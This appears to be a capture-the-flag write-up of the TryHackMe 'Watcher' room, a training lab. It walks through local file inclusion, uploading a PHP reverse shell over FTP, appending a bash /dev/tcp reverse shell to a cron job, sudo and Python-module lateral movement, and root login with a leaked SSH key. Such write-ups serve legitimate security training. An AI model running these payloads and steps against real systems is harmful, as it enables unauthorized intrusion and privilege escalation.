Watcher is a beginner level room in Tryhackme. Unlike the usual rooms where you have to get only the user and the root flag, this room had seven flags with the combination of web, user and root flags. The final objective is to get all the flags.

Deploy the VM and let's Hack the machine.

## <ins>Enumeration</ins>
---
Let's start enumerating with the usual nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/watcher/nmap_scan.png)
<br>
From the ```nmap scan``` results it is clear that the ports ```21/ftp```, ```22/ssh``` and ```80/http``` ports are open. Since I also included script scanning in the nmap scan, I noticed that ```Anonymous login``` for the ```ftp service``` is not enabled. So, I paid a visit to the ```http service```.
<br>

<br>
After running ```gobuster``` to bruteforcing hidden directories and files, I found some promising results.
<br>
<pre>gobuster dir -u http://machine-ip/ -w /usr/share/dirb/wordlists/common.txt -t 40 -x php,html,js,txt</pre>
<br>

## <ins>Flag 1</ins>
---
The first thing I checked is the ```robots.txt``` file.
<br>
![robots_txt](/assets/img/tryhackme/watcher/2.png)
<br>
After checking the ```/flag_1.txt``` file we can get the flag 1.
<br>
![flag_1](/assets/img/tryhackme/watcher/3.png)


## <ins>Flag 2</ins>
---
Checking the other file in the robots.txt file it shows an ```403``` meaning ```Forbidden```. Coming back to the home page, I clicked on the post and found that the parameter ```?post=``` is vulnerable to ```LFI```. I tried retrieving the ```/etc/passwd``` file and was successful.
<br>
![lfi_vuln](/assets/img/tryhackme/watcher/6.png)
<br>
Then I tried to view the other file mentioned in the robots.txt file. This will give the ```ftp credentials```.
<br>
![ftp_creds](/assets/img/tryhackme/watcher/7.png)
<br>
Logging in to the ftp service we can get the flag 2. You can download the flag using the ```get flag_2.txt``` command.

## <ins>Flag 3</ins>
---
Continuing with the ftp service, I noticed that the ```files``` directory in the ftp service is the same as the directory mecntioned in the secret file: ```/home/ftpuser/ftp/files```. I grabbed a php reverse shell and edited the ```ip``` and the ```port``` fields and uploaded it. You can do the same using the command ```put php-reverse-shell.php```.
<br>
![revs_php](/assets/img/tryhackme/watcher/9.png)
<br>
Now, we can get a reverse shell by going issuing a ```GET``` request to the url ```http://machine-ip/post.php?post=/home/ftpuser/ftp/files/revs.php```. Remember to open a netcat listener on your local machine.
<br>
![reverse_shell](/assets/img/tryhackme/watcher/10.png)
<br>
The first thing I did after getting the reverse shell is locating all the flags.
<br>
<pre>find / -name flag_* -type f 2>/dev/null</pre>
<br>
![flag_location](/assets/img/tryhackme/watcher/11.png)
<br>
From this we can read the flag 3.
<br>
![flag_3](/assets/img/tryhackme/watcher/13.png)
<br>


## <ins>Flag 4</ins>
---
After running ```sudo -l``` I found that anything can be run as the user ```toby```.
<br>
![sudo_l](/assets/img/tryhackme/watcher/14.png)
<br>
Use this to get the shell for the user ```toby```.
<br>
<pre>sudo -u toby /bin/bash</pre>
<br>
![toby_shell](/assets/img/tryhackme/watcher/15.png)
<br>
We can get the fourth flag with this.
<br>
![flag_4](/assets/img/tryhackme/watcher/16.png)
<br>


## <ins>Flag 5</ins>
---
After checking some usual things for lateral movement I found that the file ```cow.sh``` is run as ```cronjob```.
<br>
![cron_job](/assets/img/tryhackme/watcher/17.png)
<br>
Edit the file with the reverse shell payload.
<br>
<pre>echo "bash -i >& /dev/tcp/your-vpn-ip/4444 0>&1" >> /home/toby/jobs/cow.sh</pre>
<br>
Remember to open a netcat listener.
<br>
![reverse_shell](/assets/img/tryhackme/watcher/18.png)
<br>
And baam!! We can get the fifth flag.
<br>
![flag_5](/assets/img/tryhackme/watcher/19.png)
<br>


## <ins>Flag 6</ins>
---
I found a text file in the home directory of the user ```mat```.
<br>
![note_txt](/assets/img/tryhackme/watcher/20.png)
<br>
After looking into the ```/scripts``` directory, I found two files. The file ```cmd.py``` is owned by the user ```mat``` and the file ```will_script.py``` is owned by the user ```will```.
<br>
<pre>
###cmd.py###

def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"


###will_script.py###

import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
</pre>
<br>

Since the ```cmd.py``` is editable we can get the reverse shell using this. First we need to get the ```tty```. Use the following commands to get the ```tty``` shell.
<br>
<pre>
Ctrl+z
stty raw -echo;fg
reset
xterm-256color
export TERM=xterm-256color
</pre>
<br>
After getting the ```tty``` shell edit the file to look like this.
<br>
![file_edit](/assets/img/tryhackme/watcher/21.png)
<br>
Remeber to open a netcat listener in your local machine.
<br>
![reverse_shell](/assets/img/tryhackme/watcher/22.png)
<br>
We got the sixth flag.

## <ins>Flag 7</ins>
---
After checking the ```id```, I found that we are in same group as ```adm```. So, I searched the files that are owned by ```adm``` using ```find```.
<br>
![file_find](/assets/img/tryhackme/watcher/23.png)
<br>
Found an interesting file in the ```/opt/backups``` directory with the name ```key.b64```. Cat-ing the contents of the files, found that it is ```base64``` encoded. After decoding it contents found that it is a ```ssh private key```. Save it in your local machine.
<br>
![id_rsa](/assets/img/tryhackme/watcher/24.png)
<br>
Change the permissions of the file using ```chmod 600 id_rsa```.
<br>
<pre>ssh root@machine-ip -i id_rsa</pre>
<br>
After logging in to ssh using the private key file we can get the root flag.
<br>
![root_flag](/assets/img/tryhackme/watcher/25.png)
<br>

We got all the seven flags.

That's it folks. Happy hacking!!!
